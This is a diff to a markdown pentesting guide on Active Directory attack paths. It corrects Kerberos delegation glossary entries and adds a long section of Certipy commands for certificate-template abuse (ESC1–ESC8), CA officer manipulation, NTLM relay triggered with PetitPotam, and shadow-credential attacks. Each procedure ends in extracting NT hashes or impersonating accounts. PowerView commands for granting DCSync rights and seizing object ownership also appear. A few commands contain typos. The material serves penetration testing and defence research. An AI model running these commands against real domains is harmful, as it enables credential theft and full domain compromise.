@@ -48,6 +48,9 @@ A unique number to identify a GPO. The ObjectGUID can be used to read the group 
 ## Object Security Descriptor 
 This data structure describes who may access an object and how and defines how this access takes place (DACL + SACL).
 
+## PAC
+The Privilege Attribute Certificate is a informations inside a TGT and contains among other things the SIDs of the groups that the user is a member of.
+
 ## Realm DB 
 The central database for the Kerberos protocol.
 
@@ -58,7 +61,7 @@ An account (e.g. computer B) with set SPN (e.g. service B) can impersonate an us
 The service for User to Proxy Extension allows a service that has a service ticket from a user for its own service to request a service ticket from the domain controller on behalf of the user for other services. The S4U2Proxy extension works for resource-based constrained delegation even if the provided TGS of the user is not forwardable (design error of microsoft).
 
 ## S4U2Self 
-The service-for-User-to-Self extension allows a service (e.g., service A on computer A) to request a service ticket on behalf of a user (e.g., user X) for another service (e.g., service B) from the domain controller without user X having to interact with service A beforehand. computer A therefore does not need a service ticket from user X for service A to request a service ticket for service B on behalf of user X. In order to work, the TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION UAC flag of Service A need to be set to true. This permission is typically granted by a domain admin. If the flag is not true the resulting TGS of user X will not be forwardable.
+The service-for-User-to-Self extension allows a service to obtain a service ticket to itself on behalf of a arbitrary user. In order to work, the TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION UAC flag of Service A need to be set to true. If the flag is not true the resulting TGS of user X will not be forwardable.
 
 ## SACL 
 A System Access Control List describes which accesses to objects are to be logged.
@@ -349,7 +352,7 @@ The default states that each AD user account can add up to 10 more machine accou
 To implement this, you can use the Powermad or Impacket project (see AddAllowedToAct):
 
 However, in order to request a service ticket for a service on Computer B, an attacker needs a service ticket from user X for a service on Computer A.
-This service ticket can also be requested by Computer A without interaction of user X (using the extension S4U2Self), provided that the TRUSTED_FOR_DELEGATION flag of Computer A is set to true.
+This service ticket can also be requested by Computer A without interaction of user X (using the extension S4U2Self), provided that the TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION flag of Computer A is set to true.
 If this flag is not set in the UAC flags of Computer A, only users who actually request a TGS for Service A can be impersonated.
 The following command will request a TGT for Computer A, then request a service ticket for a service of Computer A on behalf of User X.
 The last step will request a service ticket on behalf of User X for Service B:
@@ -659,10 +662,10 @@ PS> Add-DomainObjectAcl -PrincipalIdentity <domain> -Rights DCSync
 
 After that, the further steps are the same as for GetChanges & GetChangesAll.
 
-### Owns
+## Owns
 As the owner of an object, you can also add new entries to the object's DACL (see WriteDacl).
 
-### WriteOwner
+## WriteOwner
 WriteOwner allows an attacker to overwrite the owner of an object.
 This can be done with the help of Powerview:
 
@@ -672,11 +675,11 @@ PS> $Cred = New-Object System.Management.Automation.PSCredential('<domain>\\<att
 PS> Set-DomainObjectOwner -Credential $Cred -PrincipalIdentity "<targetObject>" -OwnerIdentity <attackerUser>
 ```
 
-### GpLink
+## GpLink
 The edge indicates that the source node (GPO) is linked to the target node (OU or domain).
 A dashed edge means that the GPO is not enforced.
 
-### Contains
+## Contains
 This edge indicates that the target node (user, group or computer) is contained in the source node (Organizational Unit).
 If the edge is dashed, the OU blocks inheritance for GPOs that are not enforced.
 If a GPO is linked to an OU, this GPO applies to all objects contained in the OU.
@@ -707,6 +710,141 @@ PS> $dsEntry.PsBase.CommitChanges()
 ```
 
 The further course results depending on which object is contained in the OU - see GenericAll.
+
+## Enroll (Certipy)
+
+### ESC1
+
+ESC1 allows Client Authentication and permits the enrollee to supply an arbitrary Subject Alternative Name (SAN) to a certficate.
+
+```
+$> certipy req '<domain>/<user>:<password>'@<certificateAuthorityRhost> -ca '<certificateAuthority>' -template 'ESC1' -alt '<targetUser>@<domain>'
+```
+
+Using the certificate the NT hash can be extracted:
+
+```
+$> certipy auth -pfx '<file>.pfx' -username '<user>' -domain '<domain>' -dc-ip <domainController>
+```
+
+### ESC2
+
+ESC2 is when a certificate template can be used for any purpose (see ESC3 - use template = ESC2).
+
+### ESC3
+
+ESC3 is when a certificate template specifies the Certificate Request Agent EKU (Enrollment Agent).
+This EKU can be used to request certificates on behalf of other users. 
+
+Request Certificate Request Agent certificate:
+
+```
+$> certipy req '<domain>/<user>:<password>'@<certificateAuthorityRhost> -ca '<certificateAuthority>' -template '<ESC3>'
+```
+
+Use this certificate with -on-behalf-of parameter (must be in the form of domain\user, and not the FQDN of the domain)
+
+```
+$> certipy req '<domain>/<user>:<password>'@<certificateAuthorityRhost> -ca '<certificateAuthority>' -template 'User' -on-behalf-of '<domain>\<user>' -pfx '<file>.pfx'
+```
+
+### ESC4
+
+ESC4 is when a user has write privileges over a certificate template.
+Overwrite the template and make it vulnerable to ESC1:
+
+```
+$> certipy template '<domain>/<user>'@<certificateRhost> -hashes :<ntHash> -template 'ESC4'
+```
+
+Request a certificate:
+
+```
+$> certipy req '<domain>/<user>':'<password>'@<certificateAuthorityRhost> -ca '<certificateAuthority>' -template 'ESC4' -alt '<targetUser>@<domain>'
+```
+
+Restore the configuration afterwards:
+
+
+```
+$> certipy template '<domain>/<user>'@<certificatesRhost> -hashes :<ntHash> -template 'ESC4' -configuration '<file>.json'
+```
+
+### ESC6
+
+ESC6 is when the CA specifies the EDITF_ATTRIBUTESUBJECTALTNAME2 flag.
+In essence, this flag allows the enrollee to specify an arbitrary SAN on all certificates despite a certificate template’s configuration (see ESC1).
+
+## Manage CA & Manage Certificates
+
+In order for this technique to work, the user must also have the Manage Certificates access right, and the certificate template SubCA must be enabled.
+Add Manage Certificates access right:
+
+```
+$> certipy ca '<domain>/<user>:<password>'@<certificateAuthorityRhost> -ca '<certificateAuthority>' -add-officer '<attackerUser>'
+```
+
+Enable SubCA:
+
+```
+$> certipy ca '<domain>/<user>:<password>'@<certificateAuthorityRhost> -ca '<certificateAuthority>' -list-templates 
+
+$> certipy ca '<domain>/<user>:<password>'@<certificateAuthorityRhost> -ca '<certificateAuthority>' -enbale-template '<template>'
+```
+
+Request a certificate based on the SubCA certificate template and receive CERTSRV_E_TEMPLATE_DENIED error:
+
+```
+$> certipy req '<domain>/<user><password>'@<certificateAuthorityRhost> -ca '<certificateAuthority>' -template 'ESC4' -alt '<targetUser>@<domain>'
+```
+
+Issue a failed certificate request specifying the request ID:
+
+```
+$> certipy ca '<domain>/<user>:<password>'@<certificateAuthorityRhost> -ca '<certificateAuthority>' -issue-request <id>
+```
+
+Retreive certificate:
+
+```
+$> certipy req '<domain>/<user><password>'@<certificateAuthorityRhost> -ca '<certificateAuthority>' -retrieve <id>
+```
+
+Extract NT hash:
+
+```
+$> certipy auth -pfx '<file>.pfx' -username '<user>' -domain '<domain>' -dc-ip <domainController>
+```
+
+### ESC8
+
+An Enrollment Service has installed and enabled HTTP Web Enrollment.
+Start relay server:
+
+```
+$> certipy relay -ca <certificateAuthorityIp> -template '<DomainController>'
+```
+
+Trigger authentication using petitpotam:
+
+```
+petitpotam.py '<domain>/<user>:<password>@<fqdnRhost>' <attackerIp>
+```
+
+Get NT hash of domain controller:
+
+```
+$> certipy auth -pfx '<file>.pfx' -username '<user>' -domain '<domain>' -dc-ip <domainController>
+```
+
+## AddKeyCredentialLink
+
+Add Key Credentials to the attribute msDS-KeyCredentialLink of the target user/computer object and then perform a Kerberos Authentication as that account using PKINIT to retrieve the NT hash.
+
+```
+$> certipy shadow auto '<domain>/<user>:<password>'@<certificateAuthorityRhost> -account '<targetComputerOrUser>'
+```
+
 
 
 # Best Practice
